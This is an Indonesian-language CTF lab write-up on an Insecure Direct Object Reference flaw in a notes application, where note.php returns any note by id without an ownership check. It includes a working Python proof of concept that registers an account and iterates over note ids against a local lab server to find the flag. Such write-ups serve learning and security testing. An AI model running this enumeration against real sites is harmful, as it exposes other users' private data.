---
title: Akses Data
description: Writeup lab Akses Data
tags:
  - access control
  - IDOR
  - CTF
draft: false
---

## Summary
* Vuln Name: Insecure Direct Object Reference (IDOR)
* Type: Broken access control
* Impact: Information Disclosure
* Severity: High
* functionality: [[authorization]], [[data-retrieval]]

## Metodologi dan Observasi
1. Setelah melakukan proses [[registration]] dan [[login]], pengguna akan diarahkan ke halaman dasbor.
2. Setiap kali kita membuat atau membuka sebuah catatan (_note_), URL akan menunjukkan pola seperti `/note.php?id=1`.
3. Parameter `id` tersebut langsung digunakan dalam *query* database untuk mengambil catatan: `SELECT * FROM notes WHERE id = ?`.
4. Sayangnya, tidak ada pengecekan [[authorization]] (*ownership check*) pada level kode `note.php` untuk memastikan bahwa catatan yang diambil berdasarkan `id` tersebut benar-benar milik `$_SESSION['user_id']` yang sedang login saat ini.
5. Akibat ketiadaan validasi kepemilikan tersebut, sistem mengalami kerentanan [[IDOR]] (Insecure Direct Object Reference).

## PoC
Kita bisa mendaftarkan akun baru, lalu secara sistematis mengubah parameter `id` (mulai dari 1, 2, 3, dst.) untuk melihat semua catatan yang ada di database.

```python
import requests
import re
import random
import string

url = "http://localhost:1337"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

s = requests.Session()
username = random_string()
password = random_string()

# 1. Register
s.post(f"{url}/auth.php", data={'action': 'register', 'username': username, 'password': password, 'email': f"{username}@test.com"})

# 2. Login
s.post(f"{url}/auth.php", data={'action': 'login', 'username': username, 'password': password})

# 3. IDOR Brute-force
for note_id in range(1, 20):
    res = s.get(f"{url}/note.php?id={note_id}")
    
    # Mencari pola flag
    if "pwn{" in res.text:
        flag = re.search(r'pwn\{.*?\}', res.text).group(0)
        print(f"[+] Flag found in Note ID {note_id}: {flag}")
        break
```

## Impact
Seorang penyerang bisa melihat, memodifikasi, atau bahkan menghapus data pribadi pengguna lain, hanya dengan menebak atau menghitung parameter *identifier* objek secara berurutan.
